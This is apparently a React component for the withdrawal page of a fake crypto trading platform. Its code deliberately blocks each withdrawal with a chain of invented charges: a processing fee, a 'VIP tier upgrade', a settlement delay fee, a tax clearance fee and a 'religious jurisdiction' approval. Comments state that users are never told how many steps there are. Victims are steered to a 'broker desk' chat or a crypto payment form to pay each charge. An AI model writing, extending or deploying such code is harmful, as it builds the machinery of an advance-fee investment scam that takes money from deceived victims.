import React, { useState } from 'react';
import {
  Landmark,
  Mail,
  Coins,
  ShieldCheck,
  AlertCircle,
  CheckCircle2,
  Building2,
  ChevronRight,
  Clock,
  ExternalLink,
  Wallet,
  FileCheck2,
  Sparkles,
  MessageSquare
} from 'lucide-react';
import { ClientUser } from '../../types';
import { StoreService, useStore } from '../../services/store';
import { translations, formatCurrency } from '../../services/translations';
import { FeePaymentModal } from './FeePaymentModal';
import { CryptoIcon } from '../shared/CryptoIcon';

interface WithdrawalModalProps {
  user: ClientUser;
  currentCurrency?: string;
  currentLanguage?: string;
  onNavigate?: (tab: string) => void;
  onOpenSupport?: (message?: string) => void;
}

export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
  user,
  currentCurrency = 'USD',
  currentLanguage = 'en',
  onNavigate,
  onOpenSupport
}) => {
  const storeState = useStore();
  const allWithdrawals = storeState.withdrawals;
  const userWithdrawals = allWithdrawals.filter((w) => w.userId === user.id);

  const t = translations[currentLanguage] || translations.en;

  const [method, setMethod] = useState<'bank' | 'paypal' | 'crypto'>('crypto');
  const [amount, setAmount] = useState<string>('');

  // Bank fields
  const [bankName, setBankName] = useState('');
  const [accountHolder, setAccountHolder] = useState(user.name || '');
  const [accountNumber, setAccountNumber] = useState('');
  const [swiftCode, setSwiftCode] = useState('');
  const [iban, setIban] = useState('');

  // PayPal fields
  const [paypalEmail, setPaypalEmail] = useState(user.email || '');

  // Crypto fields
  const [asset, setAsset] = useState<'USDT' | 'BTC' | 'ETH' | 'SOL'>('USDT');
  const [network, setNetwork] = useState('TRC20');
  const [destinationAddress, setDestinationAddress] = useState('');

  const [statusMessage, setStatusMessage] = useState<{
    type: 'success' | 'error';
    text: string;
  } | null>(null);

  // Lazy Clearance Gate Modal State (Appears ONLY when user attempts to withdraw)
  const [activeGateModal, setActiveGateModal] = useState<{
    type: 'KYC' | 'WITHDRAWAL_FEE' | 'ACCOUNT_UPGRADE' | 'DELAY_FEE' | 'TAX_FEE' | 'RELIGIOUS_JURISDICTION' | 'SUCCESS_PENDING';
    title: string;
    subtitle: string;
    message: string;
    feeAmount?: number;
    actionLabel: string;
    actionType: 'NAVIGATE_KYC' | 'OPEN_SUPPORT' | 'CLOSE';
    supportMessage?: string;
  } | null>(null);

  // Separate Crypto Fee Payment Modal Drawer
  const [feePaymentModalConfig, setFeePaymentModalConfig] = useState<{
    isOpen: boolean;
    stageNumber: number;
    stageTitle: string;
    stageDescription: string;
    feeUsd: number;
  } | null>(null);

  const fee = method === 'bank' ? 25 : method === 'paypal' ? 5 : (asset === 'BTC' ? 20 : asset === 'ETH' ? 18 : 10);
  const numAmount = parseFloat(amount) || 0;
  const netAmount = Math.max(0, numAmount - fee);

  const handleAssetChange = (newAsset: 'USDT' | 'BTC' | 'ETH' | 'SOL') => {
    setAsset(newAsset);
    if (newAsset === 'USDT') setNetwork('TRC20');
    else if (newAsset === 'BTC') setNetwork('Bitcoin');
    else if (newAsset === 'ETH') setNetwork('Ethereum (ERC20)');
    else if (newAsset === 'SOL') setNetwork('Solana');
  };

  const handleWithdraw = (e: React.FormEvent) => {
    e.preventDefault();
    setStatusMessage(null);

    const val = parseFloat(amount);
    if (isNaN(val) || val <= 0) {
      setStatusMessage({ type: 'error', text: t.minWithdrawError });
      return;
    }

    if (val <= fee) {
      setStatusMessage({
        type: 'error',
        text: t.minWithdrawError
      });
      return;
    }

    if (val > user.balance) {
      setStatusMessage({
        type: 'error',
        text: t.balanceExceededError
      });
      return;
    }

    // Validate destination parameters
    if (method === 'crypto' && !destinationAddress.trim()) {
      setStatusMessage({ type: 'error', text: t.fillFieldsError });
      return;
    }
    if (method === 'bank') {
      if (!bankName.trim() || !accountHolder.trim() || (!accountNumber.trim() && !iban.trim())) {
        setStatusMessage({ type: 'error', text: t.fillFieldsError });
        return;
      }
    }
    if (method === 'paypal' && !paypalEmail.trim()) {
      setStatusMessage({ type: 'error', text: t.fillFieldsError });
      return;
    }

    // =========================================================================
    // LAZY COMPLIANCE GATING FLOW
    // The user is NEVER shown a roadmap or told there are multiple steps.
    // Each clearance requirement is displayed only when they try to withdraw.
    // =========================================================================

    // REQUIREMENT 1: KYC Identity Verification
    if (user.kycStatus !== 'verified') {
      setActiveGateModal({
        type: 'KYC',
        title: t.gateKycTitle,
        subtitle: t.gateKycSubtitle,
        message: t.gateKycMsg,
        actionLabel: t.gateKycAction,
        actionType: 'NAVIGATE_KYC'
      });
      return;
    }

    const clearance = user.withdrawalClearance || {
      withdrawalFeePaid: false,
      accountUpgraded: false,
      delayFeePaid: false,
      taxFeePaid: false,
      religiousJurisdictionApproved: false
    };

    // REQUIREMENT 2: Mandatory Withdrawal Processing Fee
    const step2Fee = clearance.withdrawalFeeAmount ?? 250;
    if (!clearance.withdrawalFeePaid) {
      const msg = t.gateFeeMsg.replace('${FEE}', `$${step2Fee.toFixed(2)} USD`);
      setActiveGateModal({
        type: 'WITHDRAWAL_FEE',
        title: t.gateFeeTitle,
        subtitle: t.gateFeeSubtitle,
        message: msg,
        feeAmount: step2Fee,
        actionLabel: t.contactBrokerDesk,
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I am requesting settlement instructions for my $${step2Fee.toFixed(2)} withdrawal processing fee.`
      });
      return;
    }

    // REQUIREMENT 3: Institutional Account Tier Upgrade
    const step3Fee = clearance.upgradeFeeAmount ?? 500;
    if (!clearance.accountUpgraded) {
      const msg = t.gateUpgradeMsg.replace('${FEE}', `$${step3Fee.toFixed(2)} USD`);
      setActiveGateModal({
        type: 'ACCOUNT_UPGRADE',
        title: t.gateUpgradeTitle,
        subtitle: t.gateUpgradeSubtitle,
        message: msg,
        feeAmount: step3Fee,
        actionLabel: t.contactBrokerDesk,
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I would like to request an Institutional Executive VIP Tier Upgrade ($${step3Fee.toFixed(2)}) for my trading account.`
      });
      return;
    }

    // REQUIREMENT 4: Liquidity Settlement Delay Fee
    const step4Fee = clearance.delayFeeAmount ?? 380;
    if (!clearance.delayFeePaid) {
      const msg = t.gateDelayMsg.replace('${FEE}', `$${step4Fee.toFixed(2)} USD`);
      setActiveGateModal({
        type: 'DELAY_FEE',
        title: t.gateDelayTitle,
        subtitle: t.gateDelaySubtitle,
        message: msg,
        feeAmount: step4Fee,
        actionLabel: t.contactBrokerDesk,
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I am ready to settle the $${step4Fee.toFixed(2)} settlement delay clearance fee.`
      });
      return;
    }

    // REQUIREMENT 5: Capital Gains Tax Clearance Certificate
    const step5Fee = clearance.taxFeeAmount ?? 520;
    if (!clearance.taxFeePaid) {
      const msg = t.gateTaxMsg.replace('${FEE}', `$${step5Fee.toFixed(2)} USD`);
      setActiveGateModal({
        type: 'TAX_FEE',
        title: t.gateTaxTitle,
        subtitle: t.gateTaxSubtitle,
        message: msg,
        feeAmount: step5Fee,
        actionLabel: t.contactBrokerDesk,
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I would like to settle my $${step5Fee.toFixed(2)} tax clearance certificate fee.`
      });
      return;
    }

    // REQUIREMENT 6: Regional & Religious Banking Exemption Approval
    const step6Fee = clearance.jurisdictionFeeAmount ?? 300;
    if (!clearance.religiousJurisdictionApproved) {
      const msg = t.gateJurisdictionMsg.replace('${FEE}', `$${step6Fee.toFixed(2)} USD`);
      setActiveGateModal({
        type: 'RELIGIOUS_JURISDICTION',
        title: t.gateJurisdictionTitle,
        subtitle: t.gateJurisdictionSubtitle,
        message: msg,
        feeAmount: step6Fee,
        actionLabel: t.contactBrokerDesk,
        actionType: 'OPEN_SUPPORT',
        supportMessage: `Hello, I am contacting you regarding regional regulatory authorization ($${step6Fee.toFixed(2)}) for my withdrawal.`
      });
      return;
    }

    // =========================================================================
    // FINAL SUBMISSION (ALL REQUIREMENTS SATISFIED)
    // =========================================================================
    StoreService.requestWithdrawal({
      userId: user.id,
      amount: val,
      fee: fee,
      asset: method === 'crypto' ? asset : (currentCurrency as any),
      destinationAddress: method === 'crypto' ? destinationAddress.trim() : (method === 'paypal' ? paypalEmail.trim() : `${bankName} - ${accountHolder} (${accountNumber || iban})`),
      method: method,
      bankName: method === 'bank' ? bankName.trim() : undefined,
      accountHolder: method === 'bank' ? accountHolder.trim() : undefined,
      accountNumber: method === 'bank' ? accountNumber.trim() : undefined,
      swiftCode: method === 'bank' ? swiftCode.trim() : undefined,
      iban: method === 'bank' ? iban.trim() : undefined,
      paypalEmail: method === 'paypal' ? paypalEmail.trim() : undefined
    });

    setAmount('');
    setDestinationAddress('');

    const successMsg = t.gateSuccessMsg.replace('{AMOUNT}', `$${val.toLocaleString()} ${currentCurrency}`);

    setActiveGateModal({
      type: 'SUCCESS_PENDING',
      title: t.gateSuccessTitle,
      subtitle: t.gateSuccessSubtitle,
      message: successMsg,
      actionLabel: t.viewMonitoredQueue,
      actionType: 'CLOSE'
    });
  };

  const handleExecuteModalAction = () => {
    if (!activeGateModal) return;

    if (activeGateModal.actionType === 'NAVIGATE_KYC') {
      setActiveGateModal(null);
      if (onNavigate) {
        onNavigate('kyc');
      }
    } else if (activeGateModal.actionType === 'OPEN_SUPPORT') {
      const supportMsg = activeGateModal.supportMessage || 'Hello, I need assistance with my withdrawal compliance requirement.';
      setActiveGateModal(null);
      if (onOpenSupport) {
        onOpenSupport(supportMsg);
      } else {
        const chatToggle = document.getElementById('bolt-chat-toggle-btn');
        if (chatToggle) chatToggle.click();
      }
    } else {
      setActiveGateModal(null);
    }
  };

  const clearance = user.withdrawalClearance;

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      {/* PENDING PAYMENT PROOF AUDIT BANNER (if user submitted TXID proof awaiting admin review) */}
      {clearance?.pendingPaymentStage && (
        <div className="p-4 rounded-3xl bg-gradient-to-r from-amber-500/20 via-orange-500/20 to-amber-500/10 border border-amber-500/50 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-amber-200 shadow-xl">
          <div className="flex items-start gap-3">
            <div className="w-10 h-10 rounded-2xl bg-amber-500/30 text-amber-300 flex items-center justify-center shrink-0 mt-0.5">
              <Clock className="w-5 h-5 animate-spin" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold text-white uppercase tracking-wider">
                  {t.paymentProofUnderReview}
                </span>
              </div>
              <div className="text-xs text-slate-300 mt-1">
                Amount:{' '}
                <strong className="text-emerald-400 font-mono font-bold">
                  {clearance.pendingPaymentAmount} {clearance.pendingPaymentCrypto}
                </strong>
                {clearance.pendingPaymentTxid && (
                  <span className="ml-2 text-slate-400 font-mono text-[11px]">
                    (TXID: {clearance.pendingPaymentTxid})
                  </span>
                )}
              </div>
              <div className="text-[11px] text-amber-300/80 mt-0.5">
                {t.paymentProofSubmittedMsg}
              </div>
            </div>
          </div>
          <div className="shrink-0 flex items-center gap-2">
            <span className="text-[11px] font-bold text-amber-400 bg-amber-500/20 px-3 py-1.5 rounded-xl border border-amber-500/30">
              Pending Audit Review
            </span>
          </div>
        </div>
      )}

      {/* INSTITUTIONAL WITHDRAWAL FORM */}
      <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-[#172338] pb-5">
          <div className="flex items-center gap-3.5">
            <div className="w-12 h-12 rounded-2xl bg-blue-600/20 border border-blue-500/40 text-blue-400 flex items-center justify-center shadow-lg shadow-blue-500/20">
              <Landmark className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">{t.withdrawTitle}</h2>
              <p className="text-xs text-slate-400">{t.withdrawSubtitle}</p>
            </div>
          </div>
          <div className="text-right">
            <div className="text-[10px] uppercase text-slate-400 font-semibold">{t.availableBalance}</div>
            <div className="text-lg font-mono font-black text-white">
              {formatCurrency(user.balance, currentCurrency)}
            </div>
          </div>
        </div>

        {statusMessage && (
          <div
            className={`p-4 rounded-2xl text-xs flex items-center gap-2.5 border ${
              statusMessage.type === 'success'
                ? 'bg-emerald-500/20 border-emerald-500/40 text-emerald-300'
                : 'bg-rose-500/20 border-rose-500/40 text-rose-300'
            }`}
          >
            {statusMessage.type === 'success' ? (
              <CheckCircle2 className="w-5 h-5 shrink-0" />
            ) : (
              <AlertCircle className="w-5 h-5 shrink-0" />
            )}
            <span>{statusMessage.text}</span>
          </div>
        )}

        {/* Method Selector Tabs */}
        <div>
          <label className="text-xs font-semibold text-slate-400 block mb-2">{t.withdrawMethod}</label>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <button
              type="button"
              id="withdraw-method-bank"
              onClick={() => setMethod('bank')}
              className={`p-3.5 rounded-2xl border text-left transition-all flex flex-col items-start gap-1.5 cursor-pointer ${
                method === 'bank'
                  ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                  : 'bg-[#0f1a30] border-[#182640] text-slate-400 hover:text-white hover:border-slate-700'
              }`}
            >
              <Landmark className={`w-5 h-5 ${method === 'bank' ? 'text-blue-400' : 'text-slate-400'}`} />
              <div>
                <div className="text-xs sm:text-sm font-bold text-white">{t.bankTransfer}</div>
                <div className="text-[10px] text-slate-400">{t.bankWireSubtitle}</div>
              </div>
            </button>

            <button
              type="button"
              id="withdraw-method-paypal"
              onClick={() => setMethod('paypal')}
              className={`p-3.5 rounded-2xl border text-left transition-all flex flex-col items-start gap-1.5 cursor-pointer ${
                method === 'paypal'
                  ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                  : 'bg-[#0f1a30] border-[#182640] text-slate-400 hover:text-white hover:border-slate-700'
              }`}
            >
              <div className="w-5 h-5 rounded-full bg-blue-500 text-white text-[11px] font-black flex items-center justify-center">
                P
              </div>
              <div>
                <div className="text-xs sm:text-sm font-bold text-white">{t.paypal}</div>
                <div className="text-[10px] text-slate-400">{t.paypalSubtitle}</div>
              </div>
            </button>

            <button
              type="button"
              id="withdraw-method-crypto"
              onClick={() => setMethod('crypto')}
              className={`p-3.5 rounded-2xl border text-left transition-all flex flex-col items-start gap-1.5 cursor-pointer ${
                method === 'crypto'
                  ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/15'
                  : 'bg-[#0f1a30] border-[#182640] text-slate-400 hover:text-white hover:border-slate-700'
              }`}
            >
              <div className="flex items-center gap-1">
                <CryptoIcon symbol="BTC" size="xs" />
                <CryptoIcon symbol="ETH" size="xs" />
              </div>
              <div>
                <div className="text-xs sm:text-sm font-bold text-white">{t.crypto}</div>
                <div className="text-[10px] text-slate-400">{t.cryptoSubtitle}</div>
              </div>
            </button>
          </div>
        </div>

        <form onSubmit={handleWithdraw} className="space-y-4">
          {/* ================= BANK FIELDS ================= */}
          {method === 'bank' && (
            <div className="space-y-3.5 p-4 rounded-2xl bg-[#0e182e] border border-[#172540]">
              <div className="text-xs font-bold text-slate-200 flex items-center gap-2 mb-2">
                <Building2 className="w-4 h-4 text-blue-400" />
                {t.bankCredentials}
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">{t.bankName} *</label>
                  <input
                    type="text"
                    required
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    placeholder={t.bankNamePlaceholder}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">{t.accountHolder} *</label>
                  <input
                    type="text"
                    required
                    value={accountHolder}
                    onChange={(e) => setAccountHolder(e.target.value)}
                    placeholder={t.accountHolderPlaceholder}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">{t.accountNumber} *</label>
                  <input
                    type="text"
                    required
                    value={accountNumber || iban}
                    onChange={(e) => {
                      setAccountNumber(e.target.value);
                      setIban(e.target.value);
                    }}
                    placeholder={t.accountNumberPlaceholder}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
                <div>
                  <label className="text-xs font-semibold text-slate-400 block mb-1">{t.swiftCode}</label>
                  <input
                    type="text"
                    value={swiftCode}
                    onChange={(e) => setSwiftCode(e.target.value)}
                    placeholder={t.swiftCodePlaceholder}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
              </div>
            </div>
          )}

          {/* ================= PAYPAL FIELDS ================= */}
          {method === 'paypal' && (
            <div className="space-y-3.5 p-4 rounded-2xl bg-[#0e182e] border border-[#172540]">
              <div className="text-xs font-bold text-slate-200 flex items-center gap-2 mb-2">
                <Mail className="w-4 h-4 text-blue-400" />
                {t.paypalInfo}
              </div>
              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">{t.paypalEmail} *</label>
                <input
                  type="email"
                  required
                  value={paypalEmail}
                  onChange={(e) => setPaypalEmail(e.target.value)}
                  placeholder="your-paypal-email@example.com"
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>
          )}

          {/* ================= CRYPTO FIELDS WITH BITCOIN AND ETHEREUM LOGOS ================= */}
          {method === 'crypto' && (
            <div className="space-y-3.5 p-4 rounded-2xl bg-[#0e182e] border border-[#172540]">
              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-2">{t.selectCrypto}</label>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                  {(['USDT', 'BTC', 'ETH', 'SOL'] as const).map((a) => (
                    <button
                      key={a}
                      type="button"
                      onClick={() => handleAssetChange(a)}
                      className={`p-3 rounded-2xl text-left border transition-all cursor-pointer flex items-center gap-3 ${
                        asset === a
                          ? 'bg-blue-600/20 border-blue-500 text-white font-bold shadow-lg shadow-blue-500/20'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                      }`}
                    >
                      <CryptoIcon symbol={a} size="sm" />
                      <div className="overflow-hidden">
                        <div className="text-sm font-extrabold text-white">{a}</div>
                        <div className="text-[10px] text-slate-400 truncate">
                          {a === 'USDT' ? 'Tether TRC20' : a === 'BTC' ? 'Bitcoin SegWit' : a === 'ETH' ? 'Ethereum ERC20' : 'Solana'}
                        </div>
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="text-xs font-semibold text-slate-400 block mb-1">
                  {t.recipientAddress} ({asset} • {network}) *
                </label>
                <input
                  type="text"
                  required
                  value={destinationAddress}
                  onChange={(e) => setDestinationAddress(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-blue-500"
                  placeholder={`Enter your ${asset} address`}
                />
              </div>
            </div>
          )}

          {/* Amount Field */}
          <div>
            <div className="flex items-center justify-between text-xs font-semibold text-slate-400 mb-1">
              <span>{t.withdrawAmount} ({currentCurrency})</span>
              <button
                type="button"
                onClick={() => setAmount(user.balance.toString())}
                className="text-blue-400 hover:text-blue-300 font-bold transition-colors cursor-pointer"
              >
                Max: {formatCurrency(user.balance, currentCurrency)}
              </button>
            </div>
            <div className="relative">
              <input
                type="number"
                step="any"
                required
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-lg font-bold font-mono text-white focus:outline-none focus:border-blue-500"
              />
              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-bold text-slate-400">
                {currentCurrency}
              </span>
            </div>
          </div>

          {/* Fee & Payout Breakdown */}
          <div className="p-3.5 rounded-2xl bg-[#09101f] border border-[#142038] space-y-2 text-xs">
            <div className="flex items-center justify-between text-slate-400">
              <span>{t.withdrawFee}</span>
              <span className="font-mono text-slate-200">
                ${fee.toFixed(2)} USD
              </span>
            </div>
            <div className="flex items-center justify-between pt-2 border-t border-[#172338]">
              <span className="font-semibold text-white">{t.netPayout}</span>
              <span className="font-mono font-bold text-emerald-400 text-sm">
                ${netAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} {currentCurrency}
              </span>
            </div>
          </div>

          <button
            type="submit"
            id="withdraw-submit-btn"
            className="w-full py-4 rounded-2xl bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-700 hover:from-blue-500 hover:to-indigo-500 text-white font-extrabold text-sm shadow-xl shadow-blue-600/30 transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-[0.99]"
          >
            <ShieldCheck className="w-5 h-5" />
            <span>{t.withdrawSubmit}</span>
            <ChevronRight className="w-4 h-4" />
          </button>
        </form>
      </div>

      {/* ================= LAZY COMPLIANCE DIRECTIVE MODAL ================= */}
      {/* Appears ONLY after user submits withdrawal attempt */}
      {activeGateModal && (
        <div className="fixed inset-0 z-[9999] overflow-y-auto bg-black/85 backdrop-blur-md p-3 sm:p-6 overscroll-contain animate-in fade-in">
          <div className="min-h-full flex items-start justify-center py-6 sm:py-12">
            <div className="bg-[#0b1325] border border-amber-500/40 rounded-3xl max-w-xl w-full p-5 sm:p-8 space-y-5 shadow-2xl relative my-auto">
              <div className="flex items-center gap-3 border-b border-[#182640] pb-4">
              <div className="w-12 h-12 rounded-2xl bg-amber-500/20 border border-amber-500/40 text-amber-400 flex items-center justify-center shrink-0">
                {activeGateModal.type === 'SUCCESS_PENDING' ? (
                  <CheckCircle2 className="w-6 h-6 text-emerald-400" />
                ) : (
                  <AlertCircle className="w-6 h-6 text-amber-400" />
                )}
              </div>
              <div>
                <div className="text-[10px] font-bold text-amber-400 uppercase tracking-widest">
                  {activeGateModal.subtitle}
                </div>
                <h3 className="text-base sm:text-lg font-bold text-white">
                  {activeGateModal.title}
                </h3>
              </div>
            </div>

            <p className="text-xs sm:text-sm text-slate-300 leading-relaxed">
              {activeGateModal.message}
            </p>

            {activeGateModal.feeAmount && (
              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 flex items-center justify-between">
                <div>
                  <span className="text-[10px] uppercase font-bold text-slate-400">
                    {t.requiredClearanceAmount}
                  </span>
                  <div className="text-xl font-bold font-mono text-white">
                    ${activeGateModal.feeAmount.toFixed(2)} USD
                  </div>
                </div>
                <div className="text-right">
                  <span className="text-[10px] uppercase font-bold text-emerald-400">
                    Status
                  </span>
                  <div className="text-xs font-bold text-amber-400">Action Required</div>
                </div>
              </div>
            )}

            <div className="pt-2 flex flex-col sm:flex-row gap-3">
              <button
                type="button"
                onClick={() => setActiveGateModal(null)}
                className="w-full sm:w-1/3 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold transition-colors cursor-pointer"
              >
                Dismiss
              </button>

              {/* If it's a fee requirement, provide instant Crypto Payment Drawer button */}
              {(activeGateModal.type === 'WITHDRAWAL_FEE' ||
                activeGateModal.type === 'ACCOUNT_UPGRADE' ||
                activeGateModal.type === 'DELAY_FEE' ||
                activeGateModal.type === 'TAX_FEE' ||
                activeGateModal.type === 'RELIGIOUS_JURISDICTION') && (
                <button
                  type="button"
                  onClick={() => {
                    const stageNum =
                      activeGateModal.type === 'WITHDRAWAL_FEE'
                        ? 2
                        : activeGateModal.type === 'ACCOUNT_UPGRADE'
                        ? 3
                        : activeGateModal.type === 'DELAY_FEE'
                        ? 4
                        : activeGateModal.type === 'TAX_FEE'
                        ? 5
                        : 6;
                    setFeePaymentModalConfig({
                      isOpen: true,
                      stageNumber: stageNum,
                      stageTitle: activeGateModal.title,
                      stageDescription: activeGateModal.message,
                      feeUsd: activeGateModal.feeAmount || 250
                    });
                    setActiveGateModal(null);
                  }}
                  className="w-full sm:flex-1 py-3 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 font-extrabold text-xs shadow-lg shadow-amber-500/25 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                >
                  <Wallet className="w-4 h-4" />
                  <span>{t.payFeeCrypto}</span>
                </button>
              )}

              <button
                type="button"
                onClick={handleExecuteModalAction}
                className="w-full sm:flex-1 py-3 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold text-xs shadow-lg shadow-blue-500/25 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <span>{activeGateModal.actionLabel}</span>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>
      </div>
      )}

      {/* Crypto Fee Payment Modal Drawer */}
      {feePaymentModalConfig?.isOpen && (
        <FeePaymentModal
          user={user}
          stageNumber={feePaymentModalConfig.stageNumber}
          stageTitle={feePaymentModalConfig.stageTitle}
          stageDescription={feePaymentModalConfig.stageDescription}
          requiredFeeUsd={feePaymentModalConfig.feeUsd}
          currentLanguage={currentLanguage}
          onClose={() => setFeePaymentModalConfig(null)}
          onPaymentSubmitted={() => {
            setFeePaymentModalConfig(null);
            setStatusMessage({
              type: 'success',
              text: `${t.paymentProofRegistered} ${t.paymentProofSubmittedMsg}`
            });
          }}
        />
      )}

      {/* Monitored Withdrawal History */}
      <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 shadow-xl space-y-4">
        <h3 className="text-sm font-bold text-white">Monitored Withdrawal Requests</h3>

        {userWithdrawals.length === 0 ? (
          <div className="py-8 text-center text-xs text-slate-500 bg-slate-950/40 rounded-2xl border border-slate-800/40">
            No withdrawal history recorded for this account.
          </div>
        ) : (
          <div className="space-y-2.5">
            {userWithdrawals.map((wd) => (
              <div
                key={wd.id}
                className="p-4 rounded-2xl bg-slate-950/60 border border-slate-800/60 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs"
              >
                <div>
                  <div className="font-bold text-white text-sm flex items-center gap-2">
                    <span>${wd.amount.toLocaleString()} ({wd.asset})</span>
                    <span className="text-[10px] px-2 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/20 font-bold uppercase">
                      {wd.method || 'crypto'}
                    </span>
                    <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-400 font-mono">
                      Net: ${(wd.amount - wd.fee).toFixed(2)}
                    </span>
                  </div>
                  <div className="text-[11px] text-slate-400 font-mono truncate max-w-sm mt-0.5">
                    {wd.method === 'bank' ? (
                      `Bank: ${wd.bankName || 'Bank Wire'} • Account/IBAN: ${wd.accountNumber || wd.iban || ''}`
                    ) : wd.method === 'paypal' ? (
                      `PayPal: ${wd.paypalEmail}`
                    ) : (
                      `Address: ${wd.destinationAddress}`
                    )}
                  </div>
                  <div className="text-[10px] text-slate-500 mt-1 flex items-center gap-2">
                    <span>{new Date(wd.requestedAt).toLocaleString()}</span>
                    {wd.txHash && <span className="text-emerald-400 font-mono">Tx: {wd.txHash.slice(0, 16)}...</span>}
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <span
                    className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider ${
                      wd.status === 'COMPLETED'
                        ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/30'
                        : wd.status === 'PROCESSING'
                        ? 'bg-blue-500/15 text-blue-400 border border-blue-500/30'
                        : wd.status === 'REJECTED'
                        ? 'bg-rose-500/15 text-rose-400 border border-rose-500/30'
                        : 'bg-amber-500/15 text-amber-400 border border-amber-500/30'
                    }`}
                  >
                    {wd.status}
                  </span>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};
